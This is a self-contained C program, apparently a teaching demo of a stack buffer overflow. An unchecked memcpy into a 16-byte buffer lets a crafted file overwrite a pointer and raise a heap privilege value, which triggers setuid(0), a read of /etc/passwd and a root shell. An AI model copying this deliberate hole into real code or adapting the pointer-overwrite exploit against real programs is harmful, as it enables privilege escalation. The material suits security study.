#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void secureapp(int * level){  //application with different privilege levels 
    if (*level==0) { //no privilege
        printf("Not allowed to access this resource\n");
    }
    else if (*level<0x10000) { //simple privilege
        printf("Your privilege level is %x\n", *level);
    }
    else { //escalated privilege
        printf("Granted elevated privileges\n");
        setuid(0);
        system("cat /etc/passwd");
        system("/bin/sh");
    }
}

void vuln(char * s, int count){
    int * ptr;
    int newdata = 0xaaaa;
    char buff[16];
    int olddata = 0xffff;
    
    ptr = &olddata;

    printf("vuln() has received %d bytes\n", count);
    memcpy(buff, s, count); //no bounds check
    
    *ptr = newdata; //use data pointer to update olddata

    printf("Input message: %s\n", s);
    printf("newdata=%x, olddata=%x\n", newdata, olddata);
}

void exploit(int * ptr){
    FILE * f;
    char overflow[32];
    unsigned int offset = 16; //offset of ptr in vuln()
    int level = 0x10000; //set a high privilege level
      
    memset(&overflow, 0x41, 32); //fill with character 'A'
    
    overflow[offset    ] =  ((int) ptr >> 24) & 0xff; 
    overflow[offset + 1] =  ((int) ptr >> 16) & 0xff;
    overflow[offset + 2] =  ((int) ptr >>  8) & 0xff;
    overflow[offset + 3] =   (int) ptr        & 0xff;
    
    overflow[offset + 4] =  (level >> 24) & 0xff; 
    overflow[offset + 5] =  (level >> 16) & 0xff;
    overflow[offset + 6] =  (level >>  8) & 0xff;
    overflow[offset + 7] =   level        & 0xff;
    
    f = fopen("priv.txt", "w");
    fwrite(overflow, 32, 1, f);
    fclose(f);
}

int main(int argc, char **argv){
    int * privilege;
    char count;
    FILE * f;
    char overflow[32];
    
    if (argc < 2) {
        printf("Missing first argument (integer).\nUsing number 24 as the first argument seems interesting.\n Exiting...\n");
        return 0;
    }
    
    count = (char) atoi(argv[1]);
    
    if (!(count > 0)) {
        printf("Incorrect first argument (%d). Exiting...\n", count);
        return 0;    
    }
    
    if ((count > 24)) {
        printf("First argument (%d) too large. Exiting...\n", count);
        return 0;    
    }
    
    privilege = (int *) malloc(1*sizeof(int)); //allocate heap memory
    *privilege = 0x0; //set initial privilege level to zero
    
    exploit(privilege); //helper function to prepare a malicious input file

    printf("Reading %d bytes from file\n", count);
  
    f = fopen("priv.txt", "r");
    if (f != NULL) {
        fread(overflow, sizeof(char), count, f);
        fclose(f);
        vuln(overflow, count);
        secureapp(privilege);
    }
    else {
        printf("Input file does not exist. Exiting...\n");
        return 0;
    }
  
  printf("Control has returned to main()\nNormal operation.\n");
  return 1;
}
